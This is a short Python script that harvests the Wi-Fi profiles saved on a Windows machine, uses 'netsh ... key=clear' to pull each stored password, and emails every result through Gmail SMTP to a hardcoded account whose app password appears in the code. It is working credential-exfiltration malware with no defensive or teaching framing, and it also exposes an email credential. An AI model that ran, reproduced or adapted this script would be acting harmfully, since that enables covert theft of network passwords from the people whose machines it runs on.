import  subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True).decode()
network_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks)

result = ""

for network_name in network_names_list:
    # network_details = subprocess.check_output(["netsh", "wlan", "show", "profile", network_name, "key", "=", "clear"])
    command = "netsh wlan show profile \"" + network_name + "\" key=clear"
    network_details = subprocess.check_output(command, shell=True)
    send_mail("testwebhack123@gmail.com", "ihys hyvb hhyl llyv ", network_details)
    result = result + str(network_details)

# send_mail("testwebhack123@gmail.com", "ihys hyvb hhyl llyv ", result)
